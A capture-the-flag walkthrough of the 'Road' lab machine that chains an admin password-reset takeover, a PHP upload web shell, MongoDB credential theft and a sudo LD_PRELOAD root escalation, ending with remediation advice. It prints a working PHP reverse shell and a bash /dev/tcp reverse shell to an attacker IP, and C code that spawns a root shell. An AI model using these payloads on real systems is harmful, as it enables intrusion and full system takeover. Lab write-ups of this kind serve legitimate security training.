## Road

Medium-difficulty Linux machine. A web application allows registration and login. An insecure password reset function lets users change the admin password. After gaining admin access, a file upload vulnerability in the profile image feature allows PHP upload. Local network services expose MongoDB, which leaks credentials for the `webdeveloper` user. The `sudo` rule for `/usr/bin/sky_backup_utility` allows `LD_PRELOAD` injection, which gives root.

**Target:** 10.49.168.167 (road)
**Difficulty:** Medium
**Attack Path:** Port scan → Web enumeration → User registration → Password reset abuse → Admin access → File upload RCE → Reverse shell → MongoDB credentials → SSH as webdeveloper → LD_PRELOAD escalation → Root

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.49.168.167
```

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache 2.4.41 (Ubuntu)
```

**Service scan**

```
nmap -sV -sC -p 22,80 10.49.168.167
```

Port 80 serves a website titled "Sky Couriers" — a B2B/B2C/C2C Logistics platform.

---

### PART 2: WEB ENUMERATION

**Directory fuzzing**

```
gobuster dir -u http://10.49.168.167/ -w /usr/share/wordlists/dirb/common.txt
```

```
/assets       (301)
/phpMyAdmin   (301)
/server-status (403)
/v2           (301)
```

Interesting findings:
- `/phpMyAdmin` is publicly accessible, though not the immediate focus.
- `/v2` is a new API or versioned endpoint.

**Manual exploration**

The homepage shows a logistics site. A login page exists, and a registration feature is available.

---

### PART 3: USER REGISTRATION AND LOGIN

**Register a test account**

```
Username: test@test.thm
Password: 123456789
```

After registration and login, we reach a dashboard. The dashboard contains a message:

```
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.
```

This reveals:
1. An admin account exists.
2. The admin email is `admin@sky.thm`.
3. We need admin access to proceed.

**Key finding:** The message leaks that admin functionality is restricted, which hints at a targeting vector.

---

### PART 4: INSECURE PASSWORD RESET

**Discover the reset endpoint**

Exploring the application, a password reset page is found. It likely allows users to reset their own password. The vulnerability is that the reset function does not properly validate which user is performing the reset.

**Exploit the reset**

Send a password reset request targeting the admin account:

```
POST /reset-password
Content-Type: multipart/form-data

username=admin@sky.thm
npass=NewAdminPassword123!
```

Or more directly, modify the request to target the admin:

```
POST /reset-password
npass=Hacked@123
admin=true
```

(The exact endpoint and parameters depend on your target. Adjust based on the actual form.)

**Result:**

```
Password changed. Taking you back...
```

The admin password is now reset to a value we control.

---

### PART 5: ADMIN LOGIN

**Log in as admin**

```
Username: admin@sky.thm
Password: Hacked@123 (or whatever was set in the reset)
```

After login, the dashboard now shows admin-only features. Viewing the page source reveals:

```html
<!-- /v2/profileimages/ -->
<script type="text/javascript">
  function showtab(tab){
    console.log(tab);
    if(tab == 'new_task'){
      $('#new_task').css('display','block');
      $('#your_task').css('display','none');
    }else{
      $('#new_task').css('display','none');
      $('#your_task').css('display','block');
    }
  }
</script>
```

**Key finding:** Profile images are stored at `/v2/profileimages/`. This is exploitable.

---

### PART 6: FILE UPLOAD AND PHP EXECUTION

**Craft a PHP reverse shell**

Create a file named `shell.php`:

```php
<?php
$sock=fsockopen("192.168.136.156",4444);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

Or use a simpler one-liner:

```php
<?php system($_GET['cmd']); ?>
```

**Upload as profile image**

The admin dashboard has a profile image upload feature. Upload `shell.php` as your profile image. The web application may not validate file types, allowing PHP to be uploaded alongside images.

**Access the uploaded file**

Once uploaded, the file is accessible at:

```
http://10.49.168.167/v2/profileimages/shell.php
```

Test for code execution:

```
http://10.49.168.167/v2/profileimages/shell.php?cmd=id
```

If successful, the output of `id` is returned.

**Trigger a reverse shell**

```
http://10.49.168.167/v2/profileimages/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/192.168.136.156/4444%20%3C%261
```

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.168.167] 54818
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-49-168-167:/$
```

---

### PART 7: SHELL STABILIZATION

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm
```

---

### PART 8: MONGODB CREDENTIAL LEAK

**Discover local services**

```
ss -tulnp
```

Output reveals several listening services:

```
tcp    LISTEN  0       151      127.0.0.1:3306      0.0.0.0:*   (MySQL)
tcp    LISTEN  0       4096     127.0.0.1:27017     0.0.0.0:*   (MongoDB)
```

MongoDB is listening on localhost:27017, but only reachable from the web server.

**Connect to MongoDB**

```
mongo
```

If `mongo` is not installed, the web server still has access as the local process. Alternatively, use `mongosh` or check if Python/Node libraries are available.

**Enumerate the database**

```
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
```

**Query the user collection**

```
use backup
db.user.find()
```

Output:

```
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

**Extracted credentials:**

```
Username: webdeveloper
Password: BahamasChapp123!@#
```

---

### PART 9: SSH AS WEBDEVELOPER

**Log in via SSH**

```
ssh webdeveloper@10.49.168.167
Password: BahamasChapp123!@#
```

**Read the user flag**

```
cat ~/user.txt
```

---

### PART 10: PRIVILEGE ESCALATION VIA LD_PRELOAD

**Check sudo rights**

```
sudo -l
```

```
Matching Defaults entries for webdeveloper on ip-10-49-168-167:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on ip-10-49-168-167:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

**Key finding:** The `env_keep+=LD_PRELOAD` setting is critical. It allows the `LD_PRELOAD` environment variable to be passed through when running sudo. This is a privilege escalation vector.

**What is LD_PRELOAD?** The `LD_PRELOAD` environment variable tells the dynamic linker to load a specified shared library before any others. If we provide a malicious library, its code runs with the privileges of the program that loads it.

**Craft the exploit library**

Create `shell.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

**Compile the library**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

If compilation fails due to missing `unistd.h`, add it to the includes (as shown above).

**Exploit**

```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

When `sky_backup_utility` runs as root, it loads `shell.so`. The `_init()` function executes with root privileges, calls `setuid(0)` and `setgid(0)` to ensure the shell runs as root, and spawns a bash session.

**Result:**

```
root@ip-10-49-168-167:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag**

```
cat /root/root.txt
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (22, 80)
  └─ Service detection

PHASE 2: Web Enumeration
  ├─ Directory fuzzing
  ├─ Find /v2 endpoint
  └─ Identify registration feature

PHASE 3: User Registration & Login
  ├─ Register test@test.thm
  └─ Access dashboard

PHASE 4: Insecure Password Reset
  ├─ Discover reset endpoint
  ├─ Reset admin password to controlled value
  └─ Admin account takeover

PHASE 5: Admin Dashboard Access
  ├─ Log in as admin
  ├─ Read page source
  └─ Identify /v2/profileimages/

PHASE 6: File Upload RCE
  ├─ Upload PHP shell as profile image
  ├─ Access shell.php via /v2/profileimages/
  └─ Reverse shell as www-data

PHASE 7: Shell Stabilization
  └─ pty and stty setup

PHASE 8: MongoDB Enumeration
  ├─ Identify listening services
  ├─ Connect to MongoDB
  ├─ Query backup.user collection
  └─ Extract webdeveloper credentials

PHASE 9: User Access
  ├─ SSH as webdeveloper
  └─ User flag

PHASE 10: Root via LD_PRELOAD
  ├─ Check sudo -l (LD_PRELOAD allowed)
  ├─ Compile shell.so
  ├─ sudo LD_PRELOAD=/tmp/shell.so sky_backup_utility
  └─ Root shell
```

---

### VULNERABILITIES

1. **Insecure Password Reset (Critical)**
   - No verification that the user performing the reset is the account owner
   - Allows takeover of the admin account

2. **File Type Validation Not Enforced (Critical)**
   - PHP files uploaded as profile images
   - Accessible in web-served directory

3. **Credentials Stored in MongoDB Without Encryption (High)**
   - Plaintext passwords in the database
   - MongoDB accessible to the web server process

4. **LD_PRELOAD Allowed in Sudo (Critical)**
   - Environment variable preserved across privilege boundary
   - Allows arbitrary code execution as root

5. **Sensitive Binary Without Input Validation (High)**
   - `sky_backup_utility` does not validate or sanitize inputs
   - LD_PRELOAD injection succeeds

---

### REMEDIATION

```
├─ Require old password verification for password reset; send reset links via email
├─ Validate file uploads by content (magic bytes), not extension
├─ Encrypt passwords with bcrypt or Argon2; never store plaintext
├─ Bind MongoDB to localhost; require authentication
├─ Remove LD_PRELOAD from env_keep in sudoers
├─ Run privileged binaries with `env -i` to strip environment
├─ Implement file integrity monitoring on critical binaries
└─ Audit and test sudo rules regularly
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- gobuster (directory discovery)
- curl or browser (web interaction)
- nc (listener)
- mongo (database queries)
- ssh (remote login)
- gcc (C compilation)
- sudo (privilege escalation with LD_PRELOAD)

**Key Insight:** The password reset flaw gave admin access, which led to file upload. MongoDB exposed credentials. The LD_PRELOAD rule turned those credentials into root.

**Concepts to Study:**
- Insecure password reset mechanisms
- File upload validation
- Dynamic linking and LD_PRELOAD injection
- Sudo environment preservation risks
- Privilege separation and escalation chains

# Jai Shri Ram
